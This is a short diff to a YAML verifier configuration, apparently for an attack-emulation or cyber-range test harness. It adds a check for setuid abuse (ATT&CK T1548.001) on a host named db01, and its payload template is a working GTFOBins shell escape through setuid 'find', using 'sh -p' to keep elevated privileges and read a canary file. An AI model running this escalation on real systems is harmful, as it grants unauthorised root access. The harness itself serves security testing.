@@ -309,6 +309,16 @@ verifier:
       to_host: app01
       to_user: appuser
 
+    - id: T1548.001
+      adapter: config_abuse
+      check: suid_binary
+      hosts: [db01]
+      start_user: dbuser
+      suid_path: "/usr/bin/find"
+      # GTFOBins shell escape for setuid find. `sh -p` is required: without it
+      # the shell drops the inherited euid and the escape gains nothing.
+      payload_template: "/usr/bin/find /etc/hostname -exec /bin/sh -p -c 'cat {canary}' \\; -quit"
+
     - id: T1068
       adapter: anchor_cve
       check: canary
